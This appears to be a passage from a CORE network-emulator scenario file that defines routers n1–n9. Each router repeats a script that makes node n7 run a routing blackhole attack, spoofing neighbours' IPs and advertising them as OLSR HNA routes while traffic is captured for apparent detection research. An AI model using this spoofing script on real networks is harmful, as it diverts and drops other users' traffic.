
node n1 {
    type router
    model router
    network-config {
	hostname n1
	!
	interface eth0
	 ip address 10.0.0.1/32
	 ipv6 address a:0::1/128
	!
    }
    iconcoords {411.0 168.0
}
    labelcoords {196.387421 486.134022}
    canvas c1
    interface-peer {eth0 n11}

    custom-post-config-commands {
route add default dev eth0
route add -net 224.0.0.0 netmask 224.0.0.0 dev eth0
    
#!/bin/sh
HN=`hostname`
if [ `uname` = "FreeBSD" ]; then
  SCRIPTDIR=/tmp/e0_$HN
else SCRIPTDIR=/root/
fi
cd $SCRIPTDIR
mkdir 7_60_60_blackholeAttack_sh_treeCoords_scen_OSPFv3MDR_treeCoords_txt
cd 7_60_60_blackholeAttack_sh_treeCoords_scen_OSPFv3MDR_treeCoords_txt
    
#get ip of current
hostnameLen=`expr length $HN`
hostnameLen=`expr $hostnameLen - 1`
myIP="10.0.0.`expr substr $HN 2 $hostnameLen`"

#now insert attack script
if [ `hostname` = n7 -o 7 = 0 ]
then

#start logging
tshark -a duration:175 -nli eth0 -T fields -E separator=, -e frame.time_epoch -e frame.len -e frame.protocols -e ip.src -e ip.dst -e ipv6.src -e ipv6.dst -e tcp.srcport -e tcp.dstport -e udp.srcport -e udp.dstport | /root/install/sedap/IntelAttacker/netCollect.py /root/7_60_60_blackholeAttack_sh_treeCoords_scen_OSPFv3MDR_treeCoords_txt $myIP > $HN.capture &    

mgen flush input /root/install/sedap/IntelAttacker/flowGenerator/flows/flow`hostname`.mgn output /dev/null &

(
cat << 'EOF'
#!/bin/bash
startTime=$1
pendingDuration=$2
attackingNode=$3
numberOfNodes=$4
logPath=$5

bringDownInterfaces()
{
sleep $pendingDuration
for ((nodeToSpoof=1;nodeToSpoof <= numberOfNodes; nodeToSpoof++))
	do
		if [ $nodeToSpoof != $attackingNode ]
			then
				ifconfig "eth0:$nodeToSpoof" down
		fi
	done
}

runOLSRAttack()
{
	killall nrlolsrd
	nrlolsrd -i eth0 -hna $logPath/tmp.txt &
	sleep $pendingDuration
	stopOLSRAttack
}

stopOLSRAttack()
{
	killall nrlolsrd
	bringDownInterfaces
	nrlolsrd -i eth0 &
}


bringUpInterfaces()
{
	for ((nodeToSpoof=1;nodeToSpoof <= numberOfNodes; nodeToSpoof++))
	do
		
		if [ $nodeToSpoof != $attackingNode ]
			then
				ipToSpoof="10.0.0.$nodeToSpoof"
				ifconfig eth0:$nodeToSpoof $ipToSpoof netmask 255.255.255.255 up
				echo "HNA $ipToSpoof 32" >> $logPath/tmp.txt
		fi
	done	
}

echo "none" > $logPath/attack.txt
sleep $startTime

if [ $pendingDuration -gt 0 ]
	then
		echo "blackHole" > $logPath/attack.txt

		if [ `ps -ef | grep nrlolsrd | wc -l` -gt 1 ]
			then
				bringUpInterfaces
				runOLSRAttack
			else
				bringDownInterfaces
		fi
fi
echo "none" > $logPath/attack.txt




EOF
) > attack.sh

chmod 755 attack.sh

./attack.sh 60 60 7 10 /root/7_60_60_blackholeAttack_sh_treeCoords_scen_OSPFv3MDR_treeCoords_txt 
else
	echo `hostname` >> /root/7_60_60_blackholeAttack_sh_treeCoords_scen_OSPFv3MDR_treeCoords_txt/check.txt
	mgen flush input /root/install/sedap/IntelAttacker/flowGenerator/flows/flow`hostname`.mgn | /root/install/sedap/IntelAttacker/mgenCollect.py /root/7_60_60_blackholeAttack_sh_treeCoords_scen_OSPFv3MDR_treeCoords_txt > `hostname`.mgencapture &
fi
    }
    services {OSPFv3MDR zebra vtysh  IPForward}
    
}

node n2 {
    type router
    model router
    network-config {
	hostname n2
	!
	interface eth0
	 ip address 10.0.0.2/32
	 ipv6 address a:0::2/128
	!
    }
    iconcoords {271.0 195.0
}
    labelcoords {196.387421 486.134022}
    canvas c1
    interface-peer {eth0 n11}

    custom-post-config-commands {
route add default dev eth0
route add -net 224.0.0.0 netmask 224.0.0.0 dev eth0
    
#!/bin/sh
HN=`hostname`
if [ `uname` = "FreeBSD" ]; then
  SCRIPTDIR=/tmp/e0_$HN
else SCRIPTDIR=/root/
fi
cd $SCRIPTDIR
mkdir 7_60_60_blackholeAttack_sh_treeCoords_scen_OSPFv3MDR_treeCoords_txt
cd 7_60_60_blackholeAttack_sh_treeCoords_scen_OSPFv3MDR_treeCoords_txt
    
#get ip of current
hostnameLen=`expr length $HN`
hostnameLen=`expr $hostnameLen - 1`
myIP="10.0.0.`expr substr $HN 2 $hostnameLen`"

#now insert attack script
if [ `hostname` = n7 -o 7 = 0 ]
then

#start logging
tshark -a duration:175 -nli eth0 -T fields -E separator=, -e frame.time_epoch -e frame.len -e frame.protocols -e ip.src -e ip.dst -e ipv6.src -e ipv6.dst -e tcp.srcport -e tcp.dstport -e udp.srcport -e udp.dstport | /root/install/sedap/IntelAttacker/netCollect.py /root/7_60_60_blackholeAttack_sh_treeCoords_scen_OSPFv3MDR_treeCoords_txt $myIP > $HN.capture &    

mgen flush input /root/install/sedap/IntelAttacker/flowGenerator/flows/flow`hostname`.mgn output /dev/null &

(
cat << 'EOF'
#!/bin/bash
startTime=$1
pendingDuration=$2
attackingNode=$3
numberOfNodes=$4
logPath=$5

bringDownInterfaces()
{
sleep $pendingDuration
for ((nodeToSpoof=1;nodeToSpoof <= numberOfNodes; nodeToSpoof++))
	do
		if [ $nodeToSpoof != $attackingNode ]
			then
				ifconfig "eth0:$nodeToSpoof" down
		fi
	done
}

runOLSRAttack()
{
	killall nrlolsrd
	nrlolsrd -i eth0 -hna $logPath/tmp.txt &
	sleep $pendingDuration
	stopOLSRAttack
}

stopOLSRAttack()
{
	killall nrlolsrd
	bringDownInterfaces
	nrlolsrd -i eth0 &
}


bringUpInterfaces()
{
	for ((nodeToSpoof=1;nodeToSpoof <= numberOfNodes; nodeToSpoof++))
	do
		
		if [ $nodeToSpoof != $attackingNode ]
			then
				ipToSpoof="10.0.0.$nodeToSpoof"
				ifconfig eth0:$nodeToSpoof $ipToSpoof netmask 255.255.255.255 up
				echo "HNA $ipToSpoof 32" >> $logPath/tmp.txt
		fi
	done	
}

echo "none" > $logPath/attack.txt
sleep $startTime

if [ $pendingDuration -gt 0 ]
	then
		echo "blackHole" > $logPath/attack.txt

		if [ `ps -ef | grep nrlolsrd | wc -l` -gt 1 ]
			then
				bringUpInterfaces
				runOLSRAttack
			else
				bringDownInterfaces
		fi
fi
echo "none" > $logPath/attack.txt




EOF
) > attack.sh

chmod 755 attack.sh

./attack.sh 60 60 7 10 /root/7_60_60_blackholeAttack_sh_treeCoords_scen_OSPFv3MDR_treeCoords_txt 
else
	echo `hostname` >> /root/7_60_60_blackholeAttack_sh_treeCoords_scen_OSPFv3MDR_treeCoords_txt/check.txt
	mgen flush input /root/install/sedap/IntelAttacker/flowGenerator/flows/flow`hostname`.mgn | /root/install/sedap/IntelAttacker/mgenCollect.py /root/7_60_60_blackholeAttack_sh_treeCoords_scen_OSPFv3MDR_treeCoords_txt > `hostname`.mgencapture &
fi
    }
    services {OSPFv3MDR zebra vtysh  IPForward}
    
}

node n3 {
    type router
    model router
    network-config {
	hostname n3
	!
	interface eth0
	 ip address 10.0.0.3/32
	 ipv6 address a:0::3/128
	!
    }
    iconcoords {549.0 167.0
}
    labelcoords {196.387421 486.134022}
    canvas c1
    interface-peer {eth0 n11}

    custom-post-config-commands {
route add default dev eth0
route add -net 224.0.0.0 netmask 224.0.0.0 dev eth0
    
#!/bin/sh
HN=`hostname`
if [ `uname` = "FreeBSD" ]; then
  SCRIPTDIR=/tmp/e0_$HN
else SCRIPTDIR=/root/
fi
cd $SCRIPTDIR
mkdir 7_60_60_blackholeAttack_sh_treeCoords_scen_OSPFv3MDR_treeCoords_txt
cd 7_60_60_blackholeAttack_sh_treeCoords_scen_OSPFv3MDR_treeCoords_txt
    
#get ip of current
hostnameLen=`expr length $HN`
hostnameLen=`expr $hostnameLen - 1`
myIP="10.0.0.`expr substr $HN 2 $hostnameLen`"

#now insert attack script
if [ `hostname` = n7 -o 7 = 0 ]
then

#start logging
tshark -a duration:175 -nli eth0 -T fields -E separator=, -e frame.time_epoch -e frame.len -e frame.protocols -e ip.src -e ip.dst -e ipv6.src -e ipv6.dst -e tcp.srcport -e tcp.dstport -e udp.srcport -e udp.dstport | /root/install/sedap/IntelAttacker/netCollect.py /root/7_60_60_blackholeAttack_sh_treeCoords_scen_OSPFv3MDR_treeCoords_txt $myIP > $HN.capture &    

mgen flush input /root/install/sedap/IntelAttacker/flowGenerator/flows/flow`hostname`.mgn output /dev/null &

(
cat << 'EOF'
#!/bin/bash
startTime=$1
pendingDuration=$2
attackingNode=$3
numberOfNodes=$4
logPath=$5

bringDownInterfaces()
{
sleep $pendingDuration
for ((nodeToSpoof=1;nodeToSpoof <= numberOfNodes; nodeToSpoof++))
	do
		if [ $nodeToSpoof != $attackingNode ]
			then
				ifconfig "eth0:$nodeToSpoof" down
		fi
	done
}

runOLSRAttack()
{
	killall nrlolsrd
	nrlolsrd -i eth0 -hna $logPath/tmp.txt &
	sleep $pendingDuration
	stopOLSRAttack
}

stopOLSRAttack()
{
	killall nrlolsrd
	bringDownInterfaces
	nrlolsrd -i eth0 &
}


bringUpInterfaces()
{
	for ((nodeToSpoof=1;nodeToSpoof <= numberOfNodes; nodeToSpoof++))
	do
		
		if [ $nodeToSpoof != $attackingNode ]
			then
				ipToSpoof="10.0.0.$nodeToSpoof"
				ifconfig eth0:$nodeToSpoof $ipToSpoof netmask 255.255.255.255 up
				echo "HNA $ipToSpoof 32" >> $logPath/tmp.txt
		fi
	done	
}

echo "none" > $logPath/attack.txt
sleep $startTime

if [ $pendingDuration -gt 0 ]
	then
		echo "blackHole" > $logPath/attack.txt

		if [ `ps -ef | grep nrlolsrd | wc -l` -gt 1 ]
			then
				bringUpInterfaces
				runOLSRAttack
			else
				bringDownInterfaces
		fi
fi
echo "none" > $logPath/attack.txt




EOF
) > attack.sh

chmod 755 attack.sh

./attack.sh 60 60 7 10 /root/7_60_60_blackholeAttack_sh_treeCoords_scen_OSPFv3MDR_treeCoords_txt 
else
	echo `hostname` >> /root/7_60_60_blackholeAttack_sh_treeCoords_scen_OSPFv3MDR_treeCoords_txt/check.txt
	mgen flush input /root/install/sedap/IntelAttacker/flowGenerator/flows/flow`hostname`.mgn | /root/install/sedap/IntelAttacker/mgenCollect.py /root/7_60_60_blackholeAttack_sh_treeCoords_scen_OSPFv3MDR_treeCoords_txt > `hostname`.mgencapture &
fi
    }
    services {OSPFv3MDR zebra vtysh  IPForward}
    
}

node n4 {
    type router
    model router
    network-config {
	hostname n4
	!
	interface eth0
	 ip address 10.0.0.4/32
	 ipv6 address a:0::4/128
	!
    }
    iconcoords {170.0 71.0
}
    labelcoords {196.387421 486.134022}
    canvas c1
    interface-peer {eth0 n11}

    custom-post-config-commands {
route add default dev eth0
route add -net 224.0.0.0 netmask 224.0.0.0 dev eth0
    
#!/bin/sh
HN=`hostname`
if [ `uname` = "FreeBSD" ]; then
  SCRIPTDIR=/tmp/e0_$HN
else SCRIPTDIR=/root/
fi
cd $SCRIPTDIR
mkdir 7_60_60_blackholeAttack_sh_treeCoords_scen_OSPFv3MDR_treeCoords_txt
cd 7_60_60_blackholeAttack_sh_treeCoords_scen_OSPFv3MDR_treeCoords_txt
    
#get ip of current
hostnameLen=`expr length $HN`
hostnameLen=`expr $hostnameLen - 1`
myIP="10.0.0.`expr substr $HN 2 $hostnameLen`"

#now insert attack script
if [ `hostname` = n7 -o 7 = 0 ]
then

#start logging
tshark -a duration:175 -nli eth0 -T fields -E separator=, -e frame.time_epoch -e frame.len -e frame.protocols -e ip.src -e ip.dst -e ipv6.src -e ipv6.dst -e tcp.srcport -e tcp.dstport -e udp.srcport -e udp.dstport | /root/install/sedap/IntelAttacker/netCollect.py /root/7_60_60_blackholeAttack_sh_treeCoords_scen_OSPFv3MDR_treeCoords_txt $myIP > $HN.capture &    

mgen flush input /root/install/sedap/IntelAttacker/flowGenerator/flows/flow`hostname`.mgn output /dev/null &

(
cat << 'EOF'
#!/bin/bash
startTime=$1
pendingDuration=$2
attackingNode=$3
numberOfNodes=$4
logPath=$5

bringDownInterfaces()
{
sleep $pendingDuration
for ((nodeToSpoof=1;nodeToSpoof <= numberOfNodes; nodeToSpoof++))
	do
		if [ $nodeToSpoof != $attackingNode ]
			then
				ifconfig "eth0:$nodeToSpoof" down
		fi
	done
}

runOLSRAttack()
{
	killall nrlolsrd
	nrlolsrd -i eth0 -hna $logPath/tmp.txt &
	sleep $pendingDuration
	stopOLSRAttack
}

stopOLSRAttack()
{
	killall nrlolsrd
	bringDownInterfaces
	nrlolsrd -i eth0 &
}


bringUpInterfaces()
{
	for ((nodeToSpoof=1;nodeToSpoof <= numberOfNodes; nodeToSpoof++))
	do
		
		if [ $nodeToSpoof != $attackingNode ]
			then
				ipToSpoof="10.0.0.$nodeToSpoof"
				ifconfig eth0:$nodeToSpoof $ipToSpoof netmask 255.255.255.255 up
				echo "HNA $ipToSpoof 32" >> $logPath/tmp.txt
		fi
	done	
}

echo "none" > $logPath/attack.txt
sleep $startTime

if [ $pendingDuration -gt 0 ]
	then
		echo "blackHole" > $logPath/attack.txt

		if [ `ps -ef | grep nrlolsrd | wc -l` -gt 1 ]
			then
				bringUpInterfaces
				runOLSRAttack
			else
				bringDownInterfaces
		fi
fi
echo "none" > $logPath/attack.txt




EOF
) > attack.sh

chmod 755 attack.sh

./attack.sh 60 60 7 10 /root/7_60_60_blackholeAttack_sh_treeCoords_scen_OSPFv3MDR_treeCoords_txt 
else
	echo `hostname` >> /root/7_60_60_blackholeAttack_sh_treeCoords_scen_OSPFv3MDR_treeCoords_txt/check.txt
	mgen flush input /root/install/sedap/IntelAttacker/flowGenerator/flows/flow`hostname`.mgn | /root/install/sedap/IntelAttacker/mgenCollect.py /root/7_60_60_blackholeAttack_sh_treeCoords_scen_OSPFv3MDR_treeCoords_txt > `hostname`.mgencapture &
fi
    }
    services {OSPFv3MDR zebra vtysh  IPForward}
    
}

node n5 {
    type router
    model router
    network-config {
	hostname n5
	!
	interface eth0
	 ip address 10.0.0.5/32
	 ipv6 address a:0::5/128
	!
    }
    iconcoords {132.0 258.0
}
    labelcoords {196.387421 486.134022}
    canvas c1
    interface-peer {eth0 n11}

    custom-post-config-commands {
route add default dev eth0
route add -net 224.0.0.0 netmask 224.0.0.0 dev eth0
    
#!/bin/sh
HN=`hostname`
if [ `uname` = "FreeBSD" ]; then
  SCRIPTDIR=/tmp/e0_$HN
else SCRIPTDIR=/root/
fi
cd $SCRIPTDIR
mkdir 7_60_60_blackholeAttack_sh_treeCoords_scen_OSPFv3MDR_treeCoords_txt
cd 7_60_60_blackholeAttack_sh_treeCoords_scen_OSPFv3MDR_treeCoords_txt
    
#get ip of current
hostnameLen=`expr length $HN`
hostnameLen=`expr $hostnameLen - 1`
myIP="10.0.0.`expr substr $HN 2 $hostnameLen`"

#now insert attack script
if [ `hostname` = n7 -o 7 = 0 ]
then

#start logging
tshark -a duration:175 -nli eth0 -T fields -E separator=, -e frame.time_epoch -e frame.len -e frame.protocols -e ip.src -e ip.dst -e ipv6.src -e ipv6.dst -e tcp.srcport -e tcp.dstport -e udp.srcport -e udp.dstport | /root/install/sedap/IntelAttacker/netCollect.py /root/7_60_60_blackholeAttack_sh_treeCoords_scen_OSPFv3MDR_treeCoords_txt $myIP > $HN.capture &    

mgen flush input /root/install/sedap/IntelAttacker/flowGenerator/flows/flow`hostname`.mgn output /dev/null &

(
cat << 'EOF'
#!/bin/bash
startTime=$1
pendingDuration=$2
attackingNode=$3
numberOfNodes=$4
logPath=$5

bringDownInterfaces()
{
sleep $pendingDuration
for ((nodeToSpoof=1;nodeToSpoof <= numberOfNodes; nodeToSpoof++))
	do
		if [ $nodeToSpoof != $attackingNode ]
			then
				ifconfig "eth0:$nodeToSpoof" down
		fi
	done
}

runOLSRAttack()
{
	killall nrlolsrd
	nrlolsrd -i eth0 -hna $logPath/tmp.txt &
	sleep $pendingDuration
	stopOLSRAttack
}

stopOLSRAttack()
{
	killall nrlolsrd
	bringDownInterfaces
	nrlolsrd -i eth0 &
}


bringUpInterfaces()
{
	for ((nodeToSpoof=1;nodeToSpoof <= numberOfNodes; nodeToSpoof++))
	do
		
		if [ $nodeToSpoof != $attackingNode ]
			then
				ipToSpoof="10.0.0.$nodeToSpoof"
				ifconfig eth0:$nodeToSpoof $ipToSpoof netmask 255.255.255.255 up
				echo "HNA $ipToSpoof 32" >> $logPath/tmp.txt
		fi
	done	
}

echo "none" > $logPath/attack.txt
sleep $startTime

if [ $pendingDuration -gt 0 ]
	then
		echo "blackHole" > $logPath/attack.txt

		if [ `ps -ef | grep nrlolsrd | wc -l` -gt 1 ]
			then
				bringUpInterfaces
				runOLSRAttack
			else
				bringDownInterfaces
		fi
fi
echo "none" > $logPath/attack.txt




EOF
) > attack.sh

chmod 755 attack.sh

./attack.sh 60 60 7 10 /root/7_60_60_blackholeAttack_sh_treeCoords_scen_OSPFv3MDR_treeCoords_txt 
else
	echo `hostname` >> /root/7_60_60_blackholeAttack_sh_treeCoords_scen_OSPFv3MDR_treeCoords_txt/check.txt
	mgen flush input /root/install/sedap/IntelAttacker/flowGenerator/flows/flow`hostname`.mgn | /root/install/sedap/IntelAttacker/mgenCollect.py /root/7_60_60_blackholeAttack_sh_treeCoords_scen_OSPFv3MDR_treeCoords_txt > `hostname`.mgencapture &
fi
    }
    services {OSPFv3MDR zebra vtysh  IPForward}
    
}

node n6 {
    type router
    model router
    network-config {
	hostname n6
	!
	interface eth0
	 ip address 10.0.0.6/32
	 ipv6 address a:0::6/128
	!
    }
    iconcoords {50.0 542.0
}
    labelcoords {196.387421 486.134022}
    canvas c1
    interface-peer {eth0 n11}

    custom-post-config-commands {
route add default dev eth0
route add -net 224.0.0.0 netmask 224.0.0.0 dev eth0
    
#!/bin/sh
HN=`hostname`
if [ `uname` = "FreeBSD" ]; then
  SCRIPTDIR=/tmp/e0_$HN
else SCRIPTDIR=/root/
fi
cd $SCRIPTDIR
mkdir 7_60_60_blackholeAttack_sh_treeCoords_scen_OSPFv3MDR_treeCoords_txt
cd 7_60_60_blackholeAttack_sh_treeCoords_scen_OSPFv3MDR_treeCoords_txt
    
#get ip of current
hostnameLen=`expr length $HN`
hostnameLen=`expr $hostnameLen - 1`
myIP="10.0.0.`expr substr $HN 2 $hostnameLen`"

#now insert attack script
if [ `hostname` = n7 -o 7 = 0 ]
then

#start logging
tshark -a duration:175 -nli eth0 -T fields -E separator=, -e frame.time_epoch -e frame.len -e frame.protocols -e ip.src -e ip.dst -e ipv6.src -e ipv6.dst -e tcp.srcport -e tcp.dstport -e udp.srcport -e udp.dstport | /root/install/sedap/IntelAttacker/netCollect.py /root/7_60_60_blackholeAttack_sh_treeCoords_scen_OSPFv3MDR_treeCoords_txt $myIP > $HN.capture &    

mgen flush input /root/install/sedap/IntelAttacker/flowGenerator/flows/flow`hostname`.mgn output /dev/null &

(
cat << 'EOF'
#!/bin/bash
startTime=$1
pendingDuration=$2
attackingNode=$3
numberOfNodes=$4
logPath=$5

bringDownInterfaces()
{
sleep $pendingDuration
for ((nodeToSpoof=1;nodeToSpoof <= numberOfNodes; nodeToSpoof++))
	do
		if [ $nodeToSpoof != $attackingNode ]
			then
				ifconfig "eth0:$nodeToSpoof" down
		fi
	done
}

runOLSRAttack()
{
	killall nrlolsrd
	nrlolsrd -i eth0 -hna $logPath/tmp.txt &
	sleep $pendingDuration
	stopOLSRAttack
}

stopOLSRAttack()
{
	killall nrlolsrd
	bringDownInterfaces
	nrlolsrd -i eth0 &
}


bringUpInterfaces()
{
	for ((nodeToSpoof=1;nodeToSpoof <= numberOfNodes; nodeToSpoof++))
	do
		
		if [ $nodeToSpoof != $attackingNode ]
			then
				ipToSpoof="10.0.0.$nodeToSpoof"
				ifconfig eth0:$nodeToSpoof $ipToSpoof netmask 255.255.255.255 up
				echo "HNA $ipToSpoof 32" >> $logPath/tmp.txt
		fi
	done	
}

echo "none" > $logPath/attack.txt
sleep $startTime

if [ $pendingDuration -gt 0 ]
	then
		echo "blackHole" > $logPath/attack.txt

		if [ `ps -ef | grep nrlolsrd | wc -l` -gt 1 ]
			then
				bringUpInterfaces
				runOLSRAttack
			else
				bringDownInterfaces
		fi
fi
echo "none" > $logPath/attack.txt




EOF
) > attack.sh

chmod 755 attack.sh

./attack.sh 60 60 7 10 /root/7_60_60_blackholeAttack_sh_treeCoords_scen_OSPFv3MDR_treeCoords_txt 
else
	echo `hostname` >> /root/7_60_60_blackholeAttack_sh_treeCoords_scen_OSPFv3MDR_treeCoords_txt/check.txt
	mgen flush input /root/install/sedap/IntelAttacker/flowGenerator/flows/flow`hostname`.mgn | /root/install/sedap/IntelAttacker/mgenCollect.py /root/7_60_60_blackholeAttack_sh_treeCoords_scen_OSPFv3MDR_treeCoords_txt > `hostname`.mgencapture &
fi
    }
    services {OSPFv3MDR zebra vtysh  IPForward}
    
}

node n7 {
    type router
    model router
    network-config {
	hostname n7
	!
	interface eth0
	 ip address 10.0.0.7/32
	 ipv6 address a:0::7/128
	!
    }
    iconcoords {220.0 520.0
}
    labelcoords {196.387421 486.134022}
    canvas c1
    interface-peer {eth0 n11}

    custom-post-config-commands {
route add default dev eth0
route add -net 224.0.0.0 netmask 224.0.0.0 dev eth0
    
#!/bin/sh
HN=`hostname`
if [ `uname` = "FreeBSD" ]; then
  SCRIPTDIR=/tmp/e0_$HN
else SCRIPTDIR=/root/
fi
cd $SCRIPTDIR
mkdir 7_60_60_blackholeAttack_sh_treeCoords_scen_OSPFv3MDR_treeCoords_txt
cd 7_60_60_blackholeAttack_sh_treeCoords_scen_OSPFv3MDR_treeCoords_txt
    
#get ip of current
hostnameLen=`expr length $HN`
hostnameLen=`expr $hostnameLen - 1`
myIP="10.0.0.`expr substr $HN 2 $hostnameLen`"

#now insert attack script
if [ `hostname` = n7 -o 7 = 0 ]
then

#start logging
tshark -a duration:175 -nli eth0 -T fields -E separator=, -e frame.time_epoch -e frame.len -e frame.protocols -e ip.src -e ip.dst -e ipv6.src -e ipv6.dst -e tcp.srcport -e tcp.dstport -e udp.srcport -e udp.dstport | /root/install/sedap/IntelAttacker/netCollect.py /root/7_60_60_blackholeAttack_sh_treeCoords_scen_OSPFv3MDR_treeCoords_txt $myIP > $HN.capture &    

mgen flush input /root/install/sedap/IntelAttacker/flowGenerator/flows/flow`hostname`.mgn output /dev/null &

(
cat << 'EOF'
#!/bin/bash
startTime=$1
pendingDuration=$2
attackingNode=$3
numberOfNodes=$4
logPath=$5

bringDownInterfaces()
{
sleep $pendingDuration
for ((nodeToSpoof=1;nodeToSpoof <= numberOfNodes; nodeToSpoof++))
	do
		if [ $nodeToSpoof != $attackingNode ]
			then
				ifconfig "eth0:$nodeToSpoof" down
		fi
	done
}

runOLSRAttack()
{
	killall nrlolsrd
	nrlolsrd -i eth0 -hna $logPath/tmp.txt &
	sleep $pendingDuration
	stopOLSRAttack
}

stopOLSRAttack()
{
	killall nrlolsrd
	bringDownInterfaces
	nrlolsrd -i eth0 &
}


bringUpInterfaces()
{
	for ((nodeToSpoof=1;nodeToSpoof <= numberOfNodes; nodeToSpoof++))
	do
		
		if [ $nodeToSpoof != $attackingNode ]
			then
				ipToSpoof="10.0.0.$nodeToSpoof"
				ifconfig eth0:$nodeToSpoof $ipToSpoof netmask 255.255.255.255 up
				echo "HNA $ipToSpoof 32" >> $logPath/tmp.txt
		fi
	done	
}

echo "none" > $logPath/attack.txt
sleep $startTime

if [ $pendingDuration -gt 0 ]
	then
		echo "blackHole" > $logPath/attack.txt

		if [ `ps -ef | grep nrlolsrd | wc -l` -gt 1 ]
			then
				bringUpInterfaces
				runOLSRAttack
			else
				bringDownInterfaces
		fi
fi
echo "none" > $logPath/attack.txt




EOF
) > attack.sh

chmod 755 attack.sh

./attack.sh 60 60 7 10 /root/7_60_60_blackholeAttack_sh_treeCoords_scen_OSPFv3MDR_treeCoords_txt 
else
	echo `hostname` >> /root/7_60_60_blackholeAttack_sh_treeCoords_scen_OSPFv3MDR_treeCoords_txt/check.txt
	mgen flush input /root/install/sedap/IntelAttacker/flowGenerator/flows/flow`hostname`.mgn | /root/install/sedap/IntelAttacker/mgenCollect.py /root/7_60_60_blackholeAttack_sh_treeCoords_scen_OSPFv3MDR_treeCoords_txt > `hostname`.mgencapture &
fi
    }
    services {OSPFv3MDR zebra vtysh  IPForward}
    
}

node n8 {
    type router
    model router
    network-config {
	hostname n8
	!
	interface eth0
	 ip address 10.0.0.8/32
	 ipv6 address a:0::8/128
	!
    }
    iconcoords {36.0 27.0
}
    labelcoords {196.387421 486.134022}
    canvas c1
    interface-peer {eth0 n11}

    custom-post-config-commands {
route add default dev eth0
route add -net 224.0.0.0 netmask 224.0.0.0 dev eth0
    
#!/bin/sh
HN=`hostname`
if [ `uname` = "FreeBSD" ]; then
  SCRIPTDIR=/tmp/e0_$HN
else SCRIPTDIR=/root/
fi
cd $SCRIPTDIR
mkdir 7_60_60_blackholeAttack_sh_treeCoords_scen_OSPFv3MDR_treeCoords_txt
cd 7_60_60_blackholeAttack_sh_treeCoords_scen_OSPFv3MDR_treeCoords_txt
    
#get ip of current
hostnameLen=`expr length $HN`
hostnameLen=`expr $hostnameLen - 1`
myIP="10.0.0.`expr substr $HN 2 $hostnameLen`"

#now insert attack script
if [ `hostname` = n7 -o 7 = 0 ]
then

#start logging
tshark -a duration:175 -nli eth0 -T fields -E separator=, -e frame.time_epoch -e frame.len -e frame.protocols -e ip.src -e ip.dst -e ipv6.src -e ipv6.dst -e tcp.srcport -e tcp.dstport -e udp.srcport -e udp.dstport | /root/install/sedap/IntelAttacker/netCollect.py /root/7_60_60_blackholeAttack_sh_treeCoords_scen_OSPFv3MDR_treeCoords_txt $myIP > $HN.capture &    

mgen flush input /root/install/sedap/IntelAttacker/flowGenerator/flows/flow`hostname`.mgn output /dev/null &

(
cat << 'EOF'
#!/bin/bash
startTime=$1
pendingDuration=$2
attackingNode=$3
numberOfNodes=$4
logPath=$5

bringDownInterfaces()
{
sleep $pendingDuration
for ((nodeToSpoof=1;nodeToSpoof <= numberOfNodes; nodeToSpoof++))
	do
		if [ $nodeToSpoof != $attackingNode ]
			then
				ifconfig "eth0:$nodeToSpoof" down
		fi
	done
}

runOLSRAttack()
{
	killall nrlolsrd
	nrlolsrd -i eth0 -hna $logPath/tmp.txt &
	sleep $pendingDuration
	stopOLSRAttack
}

stopOLSRAttack()
{
	killall nrlolsrd
	bringDownInterfaces
	nrlolsrd -i eth0 &
}


bringUpInterfaces()
{
	for ((nodeToSpoof=1;nodeToSpoof <= numberOfNodes; nodeToSpoof++))
	do
		
		if [ $nodeToSpoof != $attackingNode ]
			then
				ipToSpoof="10.0.0.$nodeToSpoof"
				ifconfig eth0:$nodeToSpoof $ipToSpoof netmask 255.255.255.255 up
				echo "HNA $ipToSpoof 32" >> $logPath/tmp.txt
		fi
	done	
}

echo "none" > $logPath/attack.txt
sleep $startTime

if [ $pendingDuration -gt 0 ]
	then
		echo "blackHole" > $logPath/attack.txt

		if [ `ps -ef | grep nrlolsrd | wc -l` -gt 1 ]
			then
				bringUpInterfaces
				runOLSRAttack
			else
				bringDownInterfaces
		fi
fi
echo "none" > $logPath/attack.txt




EOF
) > attack.sh

chmod 755 attack.sh

./attack.sh 60 60 7 10 /root/7_60_60_blackholeAttack_sh_treeCoords_scen_OSPFv3MDR_treeCoords_txt 
else
	echo `hostname` >> /root/7_60_60_blackholeAttack_sh_treeCoords_scen_OSPFv3MDR_treeCoords_txt/check.txt
	mgen flush input /root/install/sedap/IntelAttacker/flowGenerator/flows/flow`hostname`.mgn | /root/install/sedap/IntelAttacker/mgenCollect.py /root/7_60_60_blackholeAttack_sh_treeCoords_scen_OSPFv3MDR_treeCoords_txt > `hostname`.mgencapture &
fi
    }
    services {OSPFv3MDR zebra vtysh  IPForward}
    
}

node n9 {
    type router
    model router
    network-config {
	hostname n9
	!
	interface eth0
	 ip address 10.0.0.9/32
	 ipv6 address a:0::9/128
	!
    }
    iconcoords {273.0 17.0
}
    labelcoords {196.387421 486.134022}
    canvas c1
    interface-peer {eth0 n11}

    custom-post-config-commands {
route add default dev eth0
route add -net 224.0.0.0 netmask 224.0.0.0 dev eth0
    
#!/bin/sh
HN=`hostname`
if [ `uname` = "FreeBSD" ]; then
  SCRIPTDIR=/tmp/e0_$HN
else SCRIPTDIR=/root/
fi
cd $SCRIPTDIR
mkdir 7_60_60_blackholeAttack_sh_treeCoords_scen_OSPFv3MDR_treeCoords_txt
cd 7_60_60_blackholeAttack_sh_treeCoords_scen_OSPFv3MDR_treeCoords_txt
    
#get ip of current
hostnameLen=`expr length $HN`
hostnameLen=`expr $hostnameLen - 1`
myIP="10.0.0.`expr substr $HN 2 $hostnameLen`"

#now insert attack script
if [ `hostname` = n7 -o 7 = 0 ]
then

#start logging
tshark -a duration:175 -nli eth0 -T fields -E separator=, -e frame.time_epoch -e frame.len -e frame.protocols -e ip.src -e ip.dst -e ipv6.src -e ipv6.dst -e tcp.srcport -e tcp.dstport -e udp.srcport -e udp.dstport | /root/install/sedap/IntelAttacker/netCollect.py /root/7_60_60_blackholeAttack_sh_treeCoords_scen_OSPFv3MDR_treeCoords_txt $myIP > $HN.capture &    

mgen flush input /root/install/sedap/IntelAttacker/flowGenerator/flows/flow`hostname`.mgn output /dev/null &

(
cat << 'EOF'
#!/bin/bash
startTime=$1
pendingDuration=$2
attackingNode=$3
numberOfNodes=$4
logPath=$5

bringDownInterfaces()
{
sleep $pendingDuration
for ((nodeToSpoof=1;nodeToSpoof <= numberOfNodes; nodeToSpoof++))
	do
		if [ $nodeToSpoof != $attackingNode ]
			then
				ifconfig "eth0:$nodeToSpoof" down
		fi
	done
}

runOLSRAttack()
{
	killall nrlolsrd
